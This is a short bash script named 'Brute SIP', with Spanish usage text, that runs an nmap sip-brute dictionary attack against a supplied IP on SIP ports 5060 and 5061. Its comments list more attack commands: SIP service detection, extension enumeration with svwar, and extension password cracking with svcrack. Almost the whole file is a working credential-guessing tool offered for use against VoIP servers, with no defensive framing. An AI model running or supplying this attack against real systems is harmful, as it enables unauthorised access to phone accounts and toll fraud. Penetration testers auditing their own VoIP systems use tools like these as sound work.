#!/bin/bash
cat << "INFO"
                                                          ..
                               ,,,                         MM .M
                           ,!MMMMMMM!,                     MM MM  ,.
   ., .M                .MMMMMMMMMMMMMMMM.,          'MM.  MM MM .M'
 . M: M;  M          .MMMMMMMMMMMMMMMMMMMMMM,          'MM,:M M'!M'
;M MM M: .M        .MMMMMMMMMMMMMMMMMMMMMMMMMM,         'MM'...'M
 M;MM;M :MM      .MMMMMMMMMMMMMMMMMMMMMMMMMMMMMM.       .MMMMMMMM
 'M;M'M MM      MMMMMM  MMMMMMMMMMMMMMMMM  MMMMMM.    ,,M.M.'MMM'
  MM'MMMM      MMMMMM @@ MMMMMMMMMMMMMMM @@ MMMMMMM.'M''MMMM;MM'
 MM., ,MM     MMMMMMMM  MMMMMMMMMMMMMMMMM  MMMMMMMMM      '.MMM
 'MM;MMMMMMMM.MMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMM.      'MMM
  ''.'MMM'  .MMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMM       MMMM
   MMC      MMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMM.      'MMMM
  .MM      :MMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMM''MMM       MMMMM
  MMM      :M  'MMMMMMMMMMM Brute SIP MMMMMMMM'.MM  MM:M.    'MMMMM
 .MMM   ...:M: :M.'MMMMMMMMMMMMMMMMMMMMMMMMM'.M''   MM:MMMMMMMMMMMM'
AMMM..MMMMM:M.    :M.'MMMMMMMMMMMMMMMMMMMM'.MM'     MM''''''''''''
MMMMMMMMMMM:MM     'M'.M'MMMMMMMMMMMMMM'.MC'M'     .MM
 '''''''''':MM.       'MM!M.'M-M-M-M'M.'MM'        MMM
            MMM.            'MMMM!MMMM'            .MM
             MMM.             '''   ''            .MM'
              MMM.                               MMM'
               MMMM            ,.J.JJJJ.       .MMM'
                MMMM.       'JJJJJJJ'JJJM   CMMMMM
                  MMMMM.    'JJJJJJJJ'JJJ .MMMMM'
                    MMMMMMMM.'  'JJJJJ'JJMMMMM'
                      'MMMMMMMMM'JJJJJ JJJJJ'
                         ''MMMMMMJJJJJJJJJJ'
                                 'JJJJJJJJ'
INFO
if [ -z "$1" ]; then
        echo
        echo "Fuerza bruta con diccionarios a SIP."
        echo "Requiere nmap"
        echo "Uso.: sh brutesip.sh <ip>"
        echo
        exit 0
fi
echo
echo 
# deteccion: nmap -Pn -sS -sU -p 5060 --script sip-methods -O IP

# Enumeración de extensiones
# svwar -p5060 -e100-500 IP

# Fuerza bruta a extensiones SIP
# svcrack -u100 -d passwords.txt IP 

# Ataque con diccionario de usuarios
# svcrack -U users.txt -D passwords.txt 192.168.1.100

# Escaneo de servicios SIP
# sipscan 192.168.1.0/24

# Ataque con diccionarios 
nmap -Pn -p5060,5061 -sS -sU -sV -O --script sip-brute --script-args userdb=usuarios0.txt,passdb=claves0.txt $1 -vvvv
echo
